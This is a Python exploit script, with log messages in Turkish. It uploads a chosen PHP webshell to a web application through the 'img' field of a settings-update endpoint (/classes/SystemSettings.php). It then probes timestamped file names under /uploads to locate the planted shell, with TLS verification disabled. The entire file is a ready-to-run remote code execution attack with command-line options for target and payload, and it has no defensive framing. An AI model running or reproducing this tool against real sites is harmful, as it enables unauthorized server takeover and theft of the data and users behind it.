import os
import time
import logging
import requests
import colorama
from colorama import Fore
colorama.init()
import argparse

BANNER = """"""


def exploit(url:str, file:str, delay:int) -> None:
  if not os.path.exists(file):
    logging.error(Fore.RED+'[-]'+Fore.RESET+f' Webshell dosyası "{file}" yok?')
    return
  logging.info(Fore.BLUE+'[*]'+Fore.RESET+f' Web Shell dosyası "{os.path.basename(file)}" {url}/uploads yükleniyor...')
  uploadTime = int(time.time())
  r = requests.post(url + '/classes/SystemSettings.php', 
    files={'img' : (os.path.basename(file), open(file, 'rb'))},
    params={'f' : 'update_settings'},
    verify=False
  )
  if not r.ok:
    logging.error(Fore.RED+'[-]'+Fore.RESET+' HTTP yükleme isteği başarısız oldu')
    return
  logging.info(Fore.BLUE+'[*]'+Fore.RESET+f' Hedefte yeni dosya adı bulunuyor (+/- {delay} saniye) ...')
  for i in range(uploadTime - delay, uploadTime + delay + 1):
    r = requests.get(url + f'/uploads/{str(i)}_{os.path.basename(file)}', allow_redirects=False)
    logging.debug(Fore.YELLOW+'[+]'+Fore.RESET+f' Deneliyor {url}/uploads/{str(i)}_{os.path.basename(file)} ...')
    if r.status_code != 302:
      logging.success(Fore.YELLOW+'[+]'+Fore.RESET+f' Hedefte bulunan webshell dosyası {url}/uploads/{str(i)}_{os.path.basename(file)}')
      return
  logging.error(Fore.RED+'[-]'+Fore.RESET+' Hedefte dosya bulunmadı')
  # logging.warning(Fore.RED+'[-]'+Fore.RESET+' Belki daha büyük bir gecikmeye ihtiyacınız var veya dizin yüklenemez mi?')
  return
  
  
if __name__ == '__main__':
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-u', '--url',     help='website URL',                                                  type=str, required=True)
  parser.add_argument('-p', '--payload', help='PHP webshell file to upload',                                  type=str, required=True)
  parser.add_argument('-d', '--delay',   help='delay (seconds) for file timestamp in payload name on target', type=int, required=False, default=60)
  parser.add_argument('--debug',         help='enable debugging output',                                      action='store_true', default=False)
  args = parser.parse_args()
  logging.basicConfig(format='%(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO' if not args.debug else 'DEBUG')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mOK\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mX\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mW\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mI\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  print(BANNER)
  exploit(args.url, args.payload, args.delay)